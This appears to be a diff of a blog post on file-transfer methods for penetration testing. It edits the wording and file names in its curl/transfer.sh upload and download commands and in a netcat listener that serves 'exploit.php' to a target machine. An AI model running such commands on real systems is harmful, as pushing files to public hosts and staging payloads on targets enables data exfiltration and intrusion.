@@ -10,7 +10,7 @@ readingTime: 5 mins
 ----------------------------------
 
 # **#1 Curl's Transfer.sh Utility**
-My favorite(oddly for some reason) is Curl's Transfer.sh Utility. It's relatively new but for me has worked everywhere. It will upload it to a specific transfer.sh server. I like it because you do not need to mess with checking IP addresses, Ngrok,  being in or out of network, etc. It works 100% of the time, regardless of any of that. It will give you a sharable web page, QR code, and as soon as you finish the upload a link for that. You can also just use that link to make a curl request and download the file, which is what I typically do. 
+My favorite is Curl's Transfer.sh Utility. It's relatively new but for me has worked everywhere. It will upload it to a specific transfer.sh server. I like it because you do not need to mess with checking IP addresses, Ngrok, being in or out of network, etc. It works 100% of the time, regardless of any of that. It will give you a sharable web page, QR code, and as soon as you finish the upload a link for that. You can also just use that link to make a curl request and download the file, which is what I typically do. 
 
 The following command uploads the file to the transfer.sh servers...
 
@@ -24,7 +24,7 @@ To download the file on the client side, enter the following command...
 
 `curl https://transfer.sh/<CodeFromAbove>/Myfile.txt -o Myfile.txt`
 
-***-o for output, can be named anything.***
+***-o for output, can be named anything but the rest needs to match.***
 ----------------------------------
 
 # **#2 Python**
@@ -67,11 +67,11 @@ Netcat is a powerful utility to transfer files from any remote machine to a loca
 
 Make a netcat server with the following command...
 
-`nc -nlvp 8080 < stuxnet.php`
+`nc -nlvp 8080 < exploit.php`
 
 Now go to the target machine and enter the following to download the file...
 
-`nc -nv 192.168.43.177 8080 > stuxnet.php`
+`nc -nv 192.168.43.177 8080 > exploit.php`
 
 ----------------------------------
 # #4 Bash Upload
